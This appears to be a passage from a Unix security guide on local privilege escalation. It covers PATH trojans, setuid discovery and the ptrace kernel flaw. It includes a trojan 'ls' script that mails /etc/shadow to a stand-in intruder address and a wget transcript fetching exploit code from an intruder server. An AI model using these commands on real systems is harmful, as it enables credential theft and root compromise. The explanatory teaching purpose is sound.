```
#!/bin/bash
cat /etc/shadow | mail intruder@intruder_email.com
/bin/ls
```

If the root user were to now cd into joe's directory and request a directory listing by issuing the 1s command, the preceding “ls” script in joe's directory would be executed with root permissions. This would cause the /etc/shadow file to be mailed to the intruder. Since the “ls” script calls the real /bin/ls program at the end, the root user would be presented with the directory listing as requested.

# Do Not Include “.” in PATH
Never include the current directory (“.”) in your PATH.

# SOFTWARE VULNERABILITIES

Setuserid programs execute with the privileges of the file owner. Therefore, root-owned setuid files will always execute as root no matter who executes them. Attackers often concentrate on setuid programs for vulnerabilities, since these often lead to privilege escalation.

Use the following command to locate setuserid programs:

```
find / -perm -4000 -type f -print 2> /dev/null
```

Vulnerabilities in software installed on a host may allow a malicious user to gain privileges. What follows are examples of the different kinds of software vulnerabilities that a local user may attempt to exploit.

# Kernel Flaws

Vulnerabilities within the operating system kernel are also susceptible to exploitation by local users. Consider the Linux “ptrace” vulnerability, which exploits a race condition flaw in 2.2 and 2.4 kernels.

# The Ptrace Exploit

In order to exploit the ptrace vulnerability, all an intruder needs to do is obtain and run the exploit on the victim machine:

```
[bash]$ wget http://intruder's_web_server/ptrace.c
--:17:03:52--  http://intruder's_web_server/ptrace.c
==> 'ptrace.c'
Resolving intruder's_web_server... done.
Connecting to intruder's_web_server[10.0.0.1]:80... connected.
HTTP request sent, awaiting response... 200 OK
```